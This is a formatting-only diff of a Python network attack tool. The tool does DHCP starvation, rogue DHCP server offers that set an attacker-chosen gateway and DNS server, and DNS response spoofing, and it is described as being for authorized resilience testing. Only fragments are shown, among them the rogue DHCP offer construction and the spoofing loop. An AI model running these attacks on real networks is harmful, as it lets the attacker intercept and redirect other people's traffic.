@@ -43,15 +43,18 @@ class DHCPDNSAttack:
     snooping, Dynamic ARP Inspection, and DNS security controls in place.
     """
 
-    def __init__(self, interface: str,
-                 attack_mode: str = "dhcp-starvation",
-                 target_ip: Optional[str] = None,
-                 spoof_domain: Optional[str] = None,
-                 spoof_ip: Optional[str] = None,
-                 rogue_gateway: Optional[str] = None,
-                 rogue_dns: Optional[str] = None,
-                 timeout: int = 300,
-                 output_dir: str = "captures") -> None:
+    def __init__(
+        self,
+        interface: str,
+        attack_mode: str = "dhcp-starvation",
+        target_ip: Optional[str] = None,
+        spoof_domain: Optional[str] = None,
+        spoof_ip: Optional[str] = None,
+        rogue_gateway: Optional[str] = None,
+        rogue_dns: Optional[str] = None,
+        timeout: int = 300,
+        output_dir: str = "captures",
+    ) -> None:
         self.interface: str = interface
         self.attack_mode: str = attack_mode
         self.target_ip: Optional[str] = target_ip
@@ -156,15 +159,17 @@ class DHCPDNSAttack:
             chaddr=self._mac_to_bytes(client_mac),
             xid=xid,
         )
-        dhcp = DHCP(options=[
-            ("message-type", "offer"),
-            ("server_id", gateway),
-            ("lease_time", 43200),
-            ("subnet_mask", "255.255.255.0"),
-            ("router", gateway),
-            ("name_server", dns),
-            "end",
-        ])
+        dhcp = DHCP(
+            options=[
+                ("message-type", "offer"),
+                ("server_id", gateway),
+                ("lease_time", 43200),
+                ("subnet_mask", "255.255.255.0"),
+                ("router", gateway),
+                ("name_server", dns),
+                "end",
+            ]
+        )
         return ether / ip / udp / bootp / dhcp
 
     def _build_dns_response(self, query_pkt, spoof_ip: str):
@@ -277,9 +282,7 @@ class DHCPDNSAttack:
         Returns:
             Dict with the number of offers and acks sent.
         """
-        self.logger.info(
-            "Starting DHCP spoofing (rogue server) attack on %s", self.interface
-        )
+        self.logger.info("Starting DHCP spoofing (rogue server) attack on %s", self.interface)
         gateway = self.rogue_gateway or "10.0.0.1"
         dns = self.rogue_dns or gateway
 
@@ -328,9 +331,7 @@ class DHCPDNSAttack:
         """
         self.logger.info("Starting DNS spoofing attack on %s", self.interface)
         if not self.spoof_domain or not self.spoof_ip:
-            self.logger.error(
-                "dns-spoof requires both spoof_domain and spoof_ip"
-            )
+            self.logger.error("dns-spoof requires both spoof_domain and spoof_ip")
             return {
                 "attack_mode": "dns-spoof",
                 "error": "spoof_domain and spoof_ip are required",
@@ -367,9 +368,7 @@ class DHCPDNSAttack:
                 with self._lock:
                     self.dns_responses_sent += 1
                 self._record_event("dns_response_spoofed", qname=qname)
-                self.logger.info(
-                    "Spoofed DNS response for %s -> %s", qname, self.spoof_ip
-                )
+                self.logger.info("Spoofed DNS response for %s -> %s", qname, self.spoof_ip)
             except Exception as e:
                 self.logger.debug("Failed to send spoofed DNS response: %s", e)
 
@@ -461,9 +460,12 @@ class DHCPDNSAttack:
         """
         with self._lock:
             has_data = bool(
-                self.leases_requested or self.offers_received
-                or self.offers_sent or self.acks_sent
-                or self.dns_queries_seen or self.dns_responses_sent
+                self.leases_requested
+                or self.offers_received
+                or self.offers_sent
+                or self.acks_sent
+                or self.dns_queries_seen
+                or self.dns_responses_sent
                 or self.events
             )
         if not has_data:
@@ -472,9 +474,7 @@ class DHCPDNSAttack:
         try:
             os.makedirs(self.output_dir, exist_ok=True)
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            filepath = os.path.join(
-                self.output_dir, f"dhcp_dns_attack_{timestamp}.json"
-            )
+            filepath = os.path.join(self.output_dir, f"dhcp_dns_attack_{timestamp}.json")
             with open(filepath, "w", encoding="utf-8") as f:
                 json.dump(self.get_status(), f, indent=2)
             self.logger.info("Results saved to %s", filepath)
@@ -519,7 +519,7 @@ class DHCPDNSAttack:
 def main() -> None:
     parser = argparse.ArgumentParser(
         description="DHCP/DNS Attack - Test DHCP starvation, rogue DHCP "
-                    "server, and DNS spoofing resilience",
+        "server, and DNS spoofing resilience",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -541,25 +541,31 @@ Note: For authorized security testing only.
         """,
     )
 
-    parser.add_argument("-i", "--interface", required=True,
-                        help="Wireless or wired interface to use")
-    parser.add_argument("-m", "--mode", dest="attack_mode",
-                        choices=ATTACK_MODES, default="dhcp-starvation",
-                        help="Attack mode (default: dhcp-starvation)")
-    parser.add_argument("--target-ip",
-                        help="Target IP to use/offer during attacks")
-    parser.add_argument("--spoof-domain",
-                        help="Domain name to spoof DNS responses for")
-    parser.add_argument("--spoof-ip",
-                        help="IP address to return in spoofed DNS responses")
-    parser.add_argument("--rogue-gateway",
-                        help="Rogue gateway IP to offer via DHCP spoofing")
-    parser.add_argument("--rogue-dns",
-                        help="Rogue DNS server IP to offer via DHCP spoofing")
-    parser.add_argument("-t", "--timeout", type=int, default=300,
-                        help="Attack duration in seconds (default: 300)")
-    parser.add_argument("-o", "--output-dir", default="captures",
-                        help="Directory to save results (default: captures)")
+    parser.add_argument(
+        "-i", "--interface", required=True, help="Wireless or wired interface to use"
+    )
+    parser.add_argument(
+        "-m",
+        "--mode",
+        dest="attack_mode",
+        choices=ATTACK_MODES,
+        default="dhcp-starvation",
+        help="Attack mode (default: dhcp-starvation)",
+    )
+    parser.add_argument("--target-ip", help="Target IP to use/offer during attacks")
+    parser.add_argument("--spoof-domain", help="Domain name to spoof DNS responses for")
+    parser.add_argument("--spoof-ip", help="IP address to return in spoofed DNS responses")
+    parser.add_argument("--rogue-gateway", help="Rogue gateway IP to offer via DHCP spoofing")
+    parser.add_argument("--rogue-dns", help="Rogue DNS server IP to offer via DHCP spoofing")
+    parser.add_argument(
+        "-t", "--timeout", type=int, default=300, help="Attack duration in seconds (default: 300)"
+    )
+    parser.add_argument(
+        "-o",
+        "--output-dir",
+        default="captures",
+        help="Directory to save results (default: captures)",
+    )
 
     args = parser.parse_args()
     require_root()
